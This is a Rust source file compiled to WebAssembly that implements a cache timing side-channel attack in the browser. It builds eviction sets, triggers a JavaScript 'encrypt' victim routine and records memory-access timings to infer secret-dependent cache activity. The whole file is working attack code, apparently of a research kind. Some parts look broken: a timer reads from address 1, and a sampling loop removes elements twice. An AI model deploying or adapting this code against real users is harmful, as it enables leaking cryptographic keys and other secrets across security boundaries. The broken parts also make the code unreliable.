use alloc::{alloc::alloc, collections::LinkedList, vec::Vec};
use js::{encrypt, random, log};

const CACHE_LINE_SIZE : usize = 64;
const CACHE_ASSOCIATIVITY : usize = 12;

mod js {
    mod unsafe_js {
        #[link(wasm_import_module = "js")]
        extern "C" {
            pub fn random() -> f64;
            pub fn getTime() -> u64;
            pub fn encrypt();
            pub fn log(value: u64);
        }
    }
    
    pub fn random() -> f64 {
        unsafe { unsafe_js::random() }
    }
    pub fn get_time() -> u64 {
        unsafe { unsafe_js::getTime() }
    }
    pub fn encrypt() {
        unsafe { unsafe_js::encrypt() }
    }
    pub fn log(value: u64) {
        unsafe { unsafe_js::log(value) };
    }
}

pub extern "C" fn get_time() -> u64 {
    unsafe {
        core::ptr::read_unaligned(1 as *const i64) as u64
        // js::get_time()
    }
}

#[inline(always)]
fn probe(target: &[u8], offset: u32) -> u64 {
    let start = get_time();
    {
        let _ = target[offset as usize];
    }
    get_time() - start
}

#[inline(always)]
fn evict(target: &[u8], eviction_set: &LinkedList<u32>) {
    eviction_set
        .iter()
        .for_each(|offset| {
            let _ = target[*offset as usize];
        });
}

#[inline(always)]
fn wait(number_of_cycles: u32) {
    let mut i = 0;
    while i < number_of_cycles {
        i += 1;
    }
}

fn get_slow_time(eviction_set: &LinkedList<u32>, target: &[u8], offset: u32) -> u64 {
    evict(target, eviction_set);
    probe(target, offset)
}

fn generate_conflict_set(eviction_sets: &Vec<LinkedList<u32>>) -> LinkedList<u32> {
    eviction_sets
        .iter()
        .flatten()
        .cloned()
        .collect()
}

fn generate_eviction_set(target: &[u8], probe: u32, candidate_set: &LinkedList<u32>, threshold: u64) -> LinkedList<u32> {
    let mut candidate_set = candidate_set.clone();
    let mut eviction_set : LinkedList<u32> = LinkedList::new();
    while let Some(random_offset) = candidate_set.pop_front() {
        if eviction_set.len() >= CACHE_ASSOCIATIVITY {
            break;
        }
        let mut new_eviction_set : LinkedList<u32> = eviction_set.clone();
        new_eviction_set.append(& mut candidate_set);
        if threshold < get_slow_time(&new_eviction_set, target, probe) {
            eviction_set.push_back(random_offset);
        }
    }
    eviction_set
}

fn generate_candidate_set(target: &[u8]) -> LinkedList<u32> {
    let number_of_candidates = target.len() / CACHE_LINE_SIZE;
    let mut candidates : Vec<usize> = (0..number_of_candidates).collect();
    (0..number_of_candidates)
        .map(|_| {
            let index : usize = (random() * ((candidates.len() - 1) as f64)) as usize;
            let offset : u32 = candidates.swap_remove(index) as u32;
            candidates.swap_remove(index);
            offset
        })
        .collect()
}

#[no_mangle]
pub extern "C" fn my_alloc(len: usize) -> *mut u8 {
    let align = core::mem::align_of::<usize>();
    let layout = unsafe { core::alloc::Layout::from_size_align_unchecked(len, align) };
    unsafe { alloc::alloc::alloc(layout) }
    // let mut buf = Vec::<u8>::with_capacity(len);
    // let ptr = buf.as_mut_ptr();
    // core::mem::forget(buf);
    // ptr
}

#[no_mangle]
pub extern "C" fn my_dealloc(ptr: *mut u8, len: usize) {
    let align = core::mem::align_of::<usize>();
    let layout = unsafe { core::alloc::Layout::from_size_align_unchecked(len, align) };
    unsafe { alloc::alloc::dealloc(ptr, layout) }
}

#[no_mangle]
pub extern "C" fn flush_reload(threshold: u32, time_slots: u32, wait_cycles: u32, time_slot_size: u32, probes: *mut u32, probe_size: usize, target: *mut u8, target_size: usize) -> *mut u32 {
    // log_2(&"time_slots:".into(), &JsValue::from_f64(time_slots as f64));
    // log_2(&"threshold:".into(), &JsValue::from_f64(threshold as f64));
    // log_2(&"wait_cycles:".into(), &JsValue::from_f64(wait_cycles as f64));
    // log_2(&"time_slot_size:".into(), &JsValue::from_f64(time_slot_size as f64));
    // log_1(&format!("probe: {:?}", probes.iter().cloned().collect::<Vec<u32>>()).into());
    // log_1(&format!("probe: {:?}", target.len()).into());
    let target = unsafe { core::slice::from_raw_parts(target, target_size) };
    let probes = unsafe { core::slice::from_raw_parts(probes, probe_size) };
    log(threshold as u64);
    log(time_slots as u64);
    log(wait_cycles as u64);
    log(time_slot_size as u64);
    log(probes[0] as u64);
    log(probes[1] as u64);
    log(probes[2] as u64);
    let candidate_set : LinkedList<u32> = generate_candidate_set(target.as_ref());
    let eviction_sets : Vec<LinkedList<u32>> = probes //config.probes
        .iter()
        .map(|offset| generate_eviction_set(target.as_ref(), *offset, &candidate_set, threshold as u64))
        .collect();
    let conflict_set : LinkedList<u32> = generate_conflict_set(&eviction_sets);
    encrypt();
    let mut results : Vec<u32> = (0..time_slots)
        .flat_map(|_| {
            let start = get_time();
            let time_slot_results : Vec<u32> = probes
                .iter()
                .map(|p| probe(target.as_ref(), *p) as u32)
                .collect();
            evict(target.as_ref(), &conflict_set);
            while get_time() - start < time_slot_size as u64 {
                wait(wait_cycles);
            }
            time_slot_results
        })
        .collect();
    let ptr = results.as_mut_ptr();
    core::mem::forget(results);
    ptr
}